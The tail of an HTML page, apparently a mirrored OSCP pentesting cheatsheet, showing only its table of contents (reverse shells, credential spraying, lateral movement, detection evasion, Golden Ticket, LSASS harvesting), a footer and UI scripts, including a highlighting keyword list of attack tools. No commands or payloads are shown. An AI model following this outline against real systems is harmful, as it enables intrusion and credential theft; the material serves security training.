            <a href="#13932-additional-commands">13.9.3.2 Additional Commands</a>
            <a href="#13933-possible-services-to-test">13.9.3.3 Possible Services to Test</a>
          </div>
          <a href="#1394-using-kerbrute">13.9.4 Using kerbrute</a>
        </div>
        <a href="#1310-shadow-copies">13.10 Shadow Copies</a>
        <a href="#1311-constrained-delegation-attack">13.11 Constrained Delegation Attack</a>
        <button class="dropdown-btn">13.12 Enum, Creds Spraying, and Post-Enum Techniques
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#13121-key-enumeration-tools">13.12.1 Key Enumeration Tools</a>
          <a href="#13122-workflow-for-enumeration-and-credential-testing">13.12.2 Workflow for Enumeration and
            Credential Testin</a>
          <a href="#13123-port-reference-table">13.12.3 Port Reference Table</a>
          <a href="#13124-additional-enumeration-techniques">13.12.4 Additional Enumeration Techniques</a>
          <a href="#13125-detection-evasion-techniques">13.12.5 Detection Evasion Techniques</a>
          <a href="#13126-web-interfaces-for-domain-enumeration">13.12.6 Web Interfaces for Domain Enumeration</a>
          <a href="#13127-sample-outputs">13.12.7 Sample Outputs</a>
        </div>
        <a href="#1313-pass-the-ticket-ptt">13.13 Pass-the-Ticket (PtT)</a>
      </div>
    </div>

    <div class="section-blush">
      <button class="dropdown-btn">14. <span class="emoji">‚ÜîÔ∏è</span> Active Directory Lateral Movement
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#141-techniques-and-preparation">14.1 Techniques and Preparation</a>
        <button class="dropdown-btn">14.2 From Kali
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1421-evil-winrm">14.2.1 Evil-WinRM</a>
          <a href="#1422-psexec">14.2.2 PsExec</a>
          <a href="#1423-vmiexec">14.2.3 VMIExec</a>
        </div>
        <button class="dropdown-btn">14.3 From Windows
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1431-dcom-distributed-component-object-model">14.3.1 DCOM (Distributed Component Object Model)</a>
          <a href="#1432-psexec">14.3.2 PsExec</a>
          <a href="#1433-winrm">14.3.3 WinRM</a>
          <a href="#1434-winrs">14.3.4 WinRS</a>
          <a href="#1435-wmic">14.3.5 WMIC</a>
        </div>
        <button class="dropdown-btn">14.4 Credential Spraying with CrackMapExec
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1441-tips-for-credential-spraying">14.4.1 Tips for Credential Spraying</a>
          <a href="#1442-smb">14.4.2 SMB</a>
          <a href="#1443-winrm-windows-remote-management">14.4.3 WinRM (Windows Remote Management)</a>
          <a href="#1444-psexec-smb-based-lateral-movement">14.4.4 PsExec (SMB-Based Lateral Movement)</a>
          <a href="#1445-vmiexec">14.4.5 VMIExec</a>
          <a href="#1446-ldap-lightweight-directory-access-protocol">14.4.6 LDAP (Lightweight Directory Access
            Protocol)</a>
          <a href="#1447-mssql-microsoft-sql-server">14.4.7 MSSQL (Microsoft SQL Server)</a>
          <a href="#1448-rdp">14.4.8 RDP</a>
          <a href="#1449-ftp">14.4.9 FTP</a>
          <a href="#14410-ssh">14.4.10 SSH</a>
          <a href="#14411-http">14.4.11 HTTP</a>
        </div>
      </div>
    </div>

    <div class="section-lilac">
      <a href="#15-cloud-infrastructures">15. <span class="emoji">‚òÅÔ∏è</span> Cloud Infrastructures</a>
    </div>

    <div class="section-apricot">
      <button class="dropdown-btn">16. <span class="emoji">üìù</span> Reports Writing
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <button class="dropdown-btn">16.1 Tools for Note-Taking and Report Writing
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1611-recommended-tools">16.1.1 Recommended Tools</a>
          <a href="#1612-best-practices">16.1.2 Best Practices</a>
        </div>
        <button class="dropdown-btn">16.2 Capturing Screenshots
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1621-windows">16.2.1 Windows</a>
          <a href="#1622-macos">16.2.2 MacOS</a>
          <a href="#1623-kali-linux">16.2.3 Kali Linux</a>
          <a href="#1624-cross-platform-tools">16.2.4 Cross-Platform Tools</a>
          <a href="#1625-best-practices-for-screenshots">16.2.5 Best Practices for Screenshots</a>
        </div>
        <a href="#163-key-components-of-a-good-report">16.3 Key Components of a Good Report</a>
        <a href="#164-report-formatting">16.4 Report Formatting</a>
        <a href="#165-proof-of-concept-poc">16.5 Proof of Concept (PoC)</a>
        <a href="#166-compliance-reporting-optional">16.6 Compliance Reporting (Optional)</a>
        <a href="#167-common-mistakes-to-avoid">16.7 Common Mistakes to Avoid</a>
        <a href="#168-structure-for-each-vulnerability">16.8 Structure for Each Vulnerability</a>
        <a href="#169-tips-for-debrief-sessions">16.9 Tips for Debrief Sessions</a>
      </div>
    </div>

    <div class="section-powder-blue">
      <button class="dropdown-btn">17. <span class="emoji">üóÇÔ∏è</span> File Transfers
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#171-rdp-shared-folder">17.1 RDP shared folder</a>
        <a href="#172-impacket-tools">17.2 Impacket Tools</a>
        <a href="#173-ftp">17.3 FTP</a>
        <a href="#174-smb">17.4 SMB</a>
        <a href="#175-http-requests">17.5 HTTP Requests</a>
        <a href="#176-php-script-bring-files-from-windows">17.6 PHP Script (bring files from Windows)</a>
        <button class="dropdown-btn">17.7 Netcat
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1771-send-a-file">17.7.1 Send a File</a>
          <a href="#1772-send-a-file-with-compression">17.7.2 Send a File with Compression</a>
        </div>
        <button class="dropdown-btn">17.8 Using Base64 Contents
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1781-transferring-base64-via-copy-and-paste">17.8.1 Transferring Base64 via Copy and Paste</a>
          <a href="#1782-transferring-base64-contents-via-netcat">17.8.2 Transferring Base64 Contents via Netcat</a>
        </div>
      </div>
    </div>

    <div class="section-mauve">
      <button class="dropdown-btn">18. <span class="emoji">üõ†Ô∏è</span> Utilities
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <button class="dropdown-btn">18.1 Reverse Shells
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1811-bash">18.1.1 Bash</a>
          <a href="#1812-cmd">18.1.2 CMD</a>
          <a href="#1813-golang">18.1.3 Golang</a>
          <a href="#1814-java">18.1.4 Java</a>
          <a href="#1815-lua">18.1.5 Lua</a>
          <a href="#1816-netcat">18.1.6 Netcat</a>
          <a href="#1817-perl">18.1.7 Perl</a>
          <a href="#1818-powershell">18.1.8 PowerShell</a>
          <a href="#1819-php">18.1.9 PHP</a>
          <a href="#18110-python">18.1.10 Python</a>
          <a href="#18111-ruby">18.1.11 Ruby</a>
          <a href="#18112-socat">18.1.12 Socat</a>
          <a href="#18113-telnet">18.1.13 Telnet</a>
          <a href="#18114-tool-for-generating-reverse-shell">18.1.14 Tool for Generating Reverse Shell</a>
        </div>
        <button class="dropdown-btn">18.2 Upgrade Shells
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1821-adjust-interactive-shells">18.2.1 Adjust Interactive Shells</a>
          <a href="#1822-bash">18.2.2 Bash</a>
          <a href="#1823-lua">18.2.3 Lua</a>
          <a href="#1824-perl">18.2.4 Perl</a>
          <a href="#1825-python">18.2.5 Python</a>
          <a href="#1826-ruby">18.2.6 Ruby</a>
          <a href="#1827-sh">18.2.7 Sh</a>
        </div>
        <button class="dropdown-btn">18.3 Tools
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <button class="dropdown-btn">18.3.1 Linux
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#18311-bloodhound-tools">18.3.1.1 BloodHound Tools</a>
            <a href="#18312-privilege-escalation-scripts">18.3.1.2 Privilege Escalation Scripts</a>
            <a href="#18313-security-tools">18.3.1.3 Security Tools</a>
            <a href="#18314-other-utilities">18.3.1.4 Other Utilities</a>
          </div>
          <button class="dropdown-btn">18.3.2 Windows
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#18321-bloodhound-tools">18.3.2.1 BloodHound Tools</a>
            <a href="#18322-kerberos-tools">18.3.2.2 Kerberos Tools</a>
            <a href="#18323-other-utilities">18.3.2.3 Other Utilities</a>
          </div>
        </div>
        <button class="dropdown-btn">18.4 Connect to RDP
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1841-using-credentials">18.4.1 Using Credentials</a>
          <a href="#1842-using-hashes">18.4.2 Using Hashes</a>
          <a href="#1843-prompt-for-credentials">18.4.3 Prompt for Credentials</a>
          <a href="#1844-general-rdp-connect">18.4.4 General RDP Connect</a>
          <a href="#1845-enable-rdp-if-disabled">18.4.5 Enable RDP If Disabled</a>
        </div>
        <a href="#185-decoding-techniques">18.5 Decoding Techniques</a>
        <button class="dropdown-btn">18.6 Curl Usage
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1861-basic-requests">18.6.1 Basic Requests</a>
          <a href="#1862-data-submission">18.6.2 Data Submission</a>
          <a href="#1863-authentication-and-headers">18.6.3 Authentication and Headers</a>
          <a href="#1864-response-handling">18.6.4 Response Handling</a>
          <a href="#1865-cookies-and-session-management">18.6.5 Cookies and Session Management</a>
          <a href="#1866-file-operations">18.6.6 File Operations</a>
          <a href="#1867-proxy-and-security">18.6.7 Proxy and Security</a>
          <a href="#1868-additional-options">18.6.8 Additional Options</a>
        </div>
        <a href="#187-generate-a-ssh-key">18.7 Generate a SSH Key</a>
        <a href="#188-cross-compiling-for-windows">18.8 Cross Compiling for Windows</a>
        <a href="#189-managing-flags">18.9 Managing Flags</a>
        <a href="#1810-additional-tips">18.10 Additional Tips</a>
      </div>

      <div class="section-pale">
        <button class="dropdown-btn">19. <span class="emoji">‚ôüÔ∏è</span> Methodology
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <button class="dropdown-btn">19.1 Services
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#1911-initial-scanning">19.1.1 Initial Scanning</a>
            <a href="#1912-general-methodology">19.1.2 General Methodology</a>
            <button class="dropdown-btn">19.1.3 Specific Services Methodology
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#19131-ftp-with-null-session">19.1.3.1 FTP (with Null Session)</a>
              <a href="#19132-smtp">19.1.3.2 SMTP</a>
              <a href="#19133-dns">19.1.3.3 DNS</a>
              <a href="#19134-kerberos">19.1.3.4 Kerberos</a>
              <a href="#19135-pop3">19.1.3.5 POP3</a>
              <a href="#19136-rpc-with-null-session">19.1.3.6 RPC (with Null Session)</a>
              <a href="#19137-smb-with-null-session">19.1.3.7 SMB (with Null Session)</a>
              <a href="#19138-snmp">19.1.3.8 SNMP</a>
              <a href="#19139-ldap-with-null-session">19.1.3.9 LDAP (with Null Session)</a>
              <a href="#191310-redis-with-null-session">19.1.3.10 Redis (with Null Session)</a>
              <a href="#191311-rsync-with-null-session">19.1.3.11 Rsync (with Null Session)</a>
              <a href="#191312-irc">19.1.3.12 IRC</a>
            </div>
          </div>
          <button class="dropdown-btn">19.2 Web
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#1921-initial-scanning">19.2.1 Initial Scanning</a>
            <a href="#1922-vulnerability-scanning">19.2.2 Vulnerability Scanning</a>
            <a href="#1923-site-navigation-and-source-code-inspection">19.2.3 Site Navigation and Source code
              Inspection</a>
            <a href="#1924-user-enumeration-and-credential-gathering">19.2.4 User Enumeration and Credential
              Gathering</a>
            <a href="#1925-cms-and-version-detection">19.2.5 CMS and Version Detection</a>
            <a href="#1926-technology-specific-checks">19.2.6 Technology-Specific Checks</a>
            <a href="#1927-enumerate-upload-capabilities">19.2.7 Enumerate Upload Capabilities</a>
            <a href="#1928-application-logic-and-security-analysis">19.2.8 Application Logic and Security Analysis</a>
            <a href="#1929-directory-and-file-enumeration">19.2.9 Directory and File Enumeration</a>
            <a href="#19210-parameter-testing-and-sql-injection">19.2.10 Parameter Testing and SQL Injection</a>
            <a href="#19211-authentication-and-login-forms">19.2.11 Authentication and Login Forms</a>
          </div>
          <button class="dropdown-btn">19.3 Privilege Escalation
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <button class="dropdown-btn">19.3.1 Linux
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#19311-principles-to-becoming-root">19.3.1.1 Principles to Becoming Root</a>
              <a href="#19312-general-enumeration">19.3.1.2 General Enumeration</a>
              <a href="#19313-configurations-files">19.3.1.3 Configurations Files</a>
              <a href="#19314-services-and-jobs">19.3.1.4 Services and Jobs</a>
              <a href="#19315-credentials-search">19.3.1.5 Credentials Search</a>
            </div>
            <button class="dropdown-btn">19.3.2 Windows
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#19321-general-user-enumeration">19.3.2.1 General User Enumeration</a>
              <a href="#19322-system-enumeration">19.3.2.2 System Enumeration</a>
              <a href="#19323-network-enumeration">19.3.2.3 Network Enumeration</a>
              <a href="#19324-misconfigurations">19.3.2.4 Misconfigurations</a>
              <a href="#19325-credential-access">19.3.2.5 Credential Access</a>
            </div>
          </div>
          <button class="dropdown-btn">19.4 Active Directory
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <button class="dropdown-btn">19.4.1 External Machine
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#19411-basic-enumeration">19.4.1.1 Basic Enumeration</a>
              <a href="#19412-privilege-escalation">19.4.1.2 Privilege Escalation</a>
            </div>
            <button class="dropdown-btn">19.4.2 Internal Machine
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#19421-lateral-movement">19.4.2.1 Lateral Movement</a>
              <a href="#19422-privilege-escalation">19.4.2.2 Privilege Escalation</a>
            </div>
            <button class="dropdown-btn">19.4.3 Domain Controller
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#19431-targeted-ad-attacks-on-dc">19.4.3.1 Targeted AD Attacks on DC</a>
              <a href="#19432-golden-ticket-attack-for-persistent-access">19.4.3.2 Golden Ticket Attack for Persistent
                Access</a>
              <a href="#19433-credential-harvesting-with-lsass">19.4.3.3 Credential Harvesting with LSASS</a>
            </div>
            <a href="#1944-post-exploitation-and-flag-collection">19.4.4 Post-Exploitation and Flag Collection</a>
            <a href="#1945-additional-tips-for-efficiency-and-stealth">19.4.5 Additional Tips for Efficiency and
              Stealth</a>
          </div>
        </div>
      </div>

      <div class="section-soft-teal">
        <a href="#20-references">20. <span class="emoji">üìö</span> References</a>
      </div>

    </div>

  </div>
  <!-- End Index -->

  <!-- ======= Footer ======= -->
  <footer id="footer">
    <div class="container">
      <div class="credits">
        <p>
          &copy; Emmanuel Solis<br>
          Pentester &amp; Red Teamer
        </p>
      </div>
    </div>
  </footer><!-- End  Footer -->

  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
      class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
  <script src="vendor/purecounter/purecounter.js"></script>
  <script src="vendor/aos/aos.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="vendor/glightbox/js/glightbox.min.js"></script>
  <script src="vendor/isotope-layout/isotope.pkgd.min.js"></script>
  <script src="vendor/swiper/swiper-bundle.min.js"></script>
  <script src="vendor/typed.js/typed.min.js"></script>
  <script src="vendor/waypoints/noframework.waypoints.js"></script>
  <script src="vendor/php-email-form/validate.js"></script>

  <!-- Prism JS -->
  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-python.min.js"></script>
  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-c.min.js"></script>
  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-cpp.min.js"></script>
  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-sql.min.js"></script>
  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-javascript.min.js"></script>

  <!-- Template Main JS File -->
  <script src="js/main.js"></script>

  <!-- Prism JS Additional Keywords-->
  <script>
    Prism.languages.bash = Prism.languages.extend('bash', {
      'function': /\b(?:aircrack-ng|amap|arpspoof|beef|bettercap|bloodhound|burpsuite|ldapsearch|cain|crackmapexec|cewl|curl|cd|dirb|dnsenum|dnsspoof|dnstracer|enum4linux|ettercap|echo|xfreerdp|rdesktop|chmod|mv|sudo|ssh|find|etterfilter|exploitdb|ftp|gobuster|hashcat|hashid|hash-identifier|hydra|httrack|smbmap|impacket-GetNPUsers|impacket-GetTGT|impacket-psexec|impacket-secretsdump|impacket-smbexec|ike-scan|john|kerbrute|linenum|linpeas|ls|maltego|masscan|medusa|metasploit|mimikatz|ms08-067|msfcli|msfconsole|msfupdate|msfvenom|nbtscan|nc|netcat|netdiscover|netstat|nikto|nmap|nslookup|openssh|patator|ping|powershell-empire|powersploit|proxychains|psexec|python|python2|python2.7|python3|reaver|responder|scp|searchsploit|setoolkit|shellshock|smtp-user-enum|smbclient|snmp-check|snmpwalk|sparta|sqlmap|sqlninja|sslscan|sublist3r|tcpdump|telnet|whois|theHarvester|tmux|tshark|ticketer|unicornscan|veil|volatility|wfuzz|whatweb|wireshark|windows-exploit-suggester|w3af|xsser|xsstrike|rpcclient|zaproxy)\b/
    });
  </script>
  <script>
    Prism.languages.powershell = Prism.languages.extend('powershell', {
      'function': /\b(?:Add-ADGroupMember|Add-Computer|Add-Content|Add-ExchangeAdministrator|Add-Member|Add-Type|Checkpoint-Computer|Clear-Content|Clear-History|Clear-Item|Clear-ItemProperty|Clear-Variable|Compare-Object|ConvertFrom-Json|ConvertTo-Json|Copy-Item|Copy-ItemProperty|Disable-ADAccount|Disable-PSRemoting|Enable-ADAccount|Enable-PSRemoting|Export-Csv|Export-ModuleMember|Export-PSSession|Find-Module|Get-ADComputer|Get-ADDomain|Get-ADGroup|Get-ADUser|Get-Alias|Get-AuthenticodeSignature|Get-ChildItem|Get-Clipboard|Get-Command|Get-Content|Get-Credential|Get-Date|Get-EventLog|Get-Help|Get-History|Get-Item|Get-ItemProperty|Get-LocalGroupMember|Get-Location|Get-Member|Get-Module|Get-Process|Get-Service|Get-Variable|Get-WinEvent|Import-Csv|Import-Module|Invoke-Command|Invoke-Expression|Invoke-RestMethod|Invoke-WebRequest|Measure-Object|Move-Item|New-ADUser|New-Alias|New-Item|New-Module|New-PSDrive|New-PSSession|Out-File|Read-Host|Remove-ADUser|Remove-Item|Remove-Module|Remove-PSDrive|Remove-Variable|Restart-Computer|Restore-Computer|Select-Object|Set-ADUser|Set-Alias|Set-Content|Set-Date|Set-Item|Set-Location|Set-Variable|Start-Process|Stop-Process|Test-Connection|Test-Path|Update-Help|Write-Host|Write-Output)\b/
    });
  </script>

  <script>
    let allOpen = false; // Track the state of the dropdowns

    function toggleIndex() {
      const index = document.getElementById('index');
      index.classList.toggle('open');
    }

    function toggleAll() {
      const dropdownContainers = document.querySelectorAll('.dropdown-container, .nested-dropdown-container');
      const buttons = document.querySelectorAll('.dropdown-btn, .nested-dropdown-btn');

      // Set the new state based on the current state
      allOpen = !allOpen;

      for (let i = 0; i < dropdownContainers.length; i++) {
        const container = dropdownContainers[i];
        const btn = buttons[i];
        if (allOpen) {
          container.style.display = 'block';
          btn.classList.add('active');
        } else {
          container.style.display = 'none';
          btn.classList.remove('active');
        }
      }
    }

    const dropdownBtns = document.getElementsByClassName("dropdown-btn");
    for (let i = 0; i < dropdownBtns.length; i++) {
      dropdownBtns[i].addEventListener("click", function () {
        this.classList.toggle("active");
        const dropdownContent = this.nextElementSibling;
        if (dropdownContent.style.display === "block") {
          dropdownContent.style.display = "none";
        } else {
          dropdownContent.style.display = "block";
        }
      });
    }

    const nestedDropdownBtns = document.getElementsByClassName("nested-dropdown-btn");
    for (let i = 0; i < nestedDropdownBtns.length; i++) {
      nestedDropdownBtns[i].addEventListener("click", function () {
        this.classList.toggle("active");
        const nestedDropdownContent = this.nextElementSibling;
        if (nestedDropdownContent.style.display === "block") {
          nestedDropdownContent.style.display = "none";
        } else {
          nestedDropdownContent.style.display = "block";
        }
      });
    }

    setTimeout(function () {
      var alert = document.querySelector('.alert-warning');
      if (alert) {
        var bootstrapAlert = new bootstrap.Alert(alert);
        bootstrapAlert.close();
      }
    }, 7000); // 7 seconds

    // Check if there's any saved state and apply it
    window.addEventListener('DOMContentLoaded', (event) => {
      // Load the saved state for checkboxes
      const checkboxes = document.querySelectorAll('ul li input[type="checkbox"]');
      checkboxes.forEach((checkbox, index) => {
        const isChecked = sessionStorage.getItem(`checkbox-${index}`) === 'true';
        checkbox.checked = isChecked;
        toggleCheckedClass(checkbox);
      });
    });

    // Toggle the 'checked' class and save state
    function toggleCheckedClass(checkbox) {
      const listItem = checkbox.parentElement;
      if (checkbox.checked) {
        listItem.classList.add('checked');
      } else {
        listItem.classList.remove('checked');
      }
    }

    // Attach event listeners to checkboxes to save state on change
    document.querySelectorAll('ul li input[type="checkbox"]').forEach((checkbox, index) => {
      checkbox.addEventListener('change', () => {
        sessionStorage.setItem(`checkbox-${index}`, checkbox.checked);
        toggleCheckedClass(checkbox);
      });
    });

    function removeHighlights(element) {
      element.innerHTML = element.innerHTML.replace(/<\/?strong>/gi, "");
    }

    function highlightTerm(element, term) {
      const regex = new RegExp(`(${term})`, 'gi');
      element.innerHTML = element.innerHTML.replace(regex, "<strong>$1</strong>");
    }

    document.getElementById("search-input").addEventListener("input", function () {
      const searchTerm = this.value.toLowerCase();
      const headings = document.querySelectorAll(".cheatsheet-content h2, .cheatsheet-content h3, .cheatsheet-content h4, .cheatsheet-content h5, .cheatsheet-content h6");
      let anyMatch = false;

      headings.forEach((heading) => {
        const text = heading.textContent.toLowerCase();
        const sectionContent = [];

        // Get all sibling elements until the next heading
        let sibling = heading.nextElementSibling;
        while (sibling && !sibling.matches("h2, h3, h4, h5, h6")) {
          sectionContent.push(sibling);
          sibling = sibling.nextElementSibling;
        }

        // Remove existing highlights
        removeHighlights(heading);

        // Only show headings and content that match the search term
        if (text.includes(searchTerm)) {
          heading.style.display = "";
          sectionContent.forEach((elem) => (elem.style.display = ""));
          if (searchTerm) {
            highlightTerm(heading, searchTerm);
          }

          anyMatch = true;
        } else {
          // Hide non-matching headings and content
          heading.style.display = "none";
          sectionContent.forEach((elem) => (elem.style.display = "none"));
        }
      });

      const noMatchMessage = document.getElementById("no-match-message");
      if (!anyMatch) {
        if (!noMatchMessage) {
          const message = document.createElement("p");
          message.id = "no-match-message";
          message.className = "text-danger mt-3";
          message.textContent = "No matches found.";
          document.querySelector(".cheatsheet-content").appendChild(message);
        }
      } else if (noMatchMessage) {
        noMatchMessage.remove();
      }
    });

    function toggleSubmenu(event) {
      event.preventDefault(); // Prevents navigation
      const submenu = event.currentTarget.nextElementSibling;
      const arrow = event.currentTarget.querySelector('.arrow');

      submenu.classList.toggle('open'); // Toggle the submenu visibility
      // Rotate the arrow based on whether the submenu is open
      if (submenu.classList.contains('open')) {
        arrow.style.transform = 'rotate(0deg)'; // Arrow points right when closed
      } else {
        arrow.style.transform = 'rotate(-90deg)';  // Arrow points down when open
      }
    }
  </script>

</body>


<!-- Mirrored from www.emmanuelsolis.com/oscp.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:44:16 GMT -->
</html>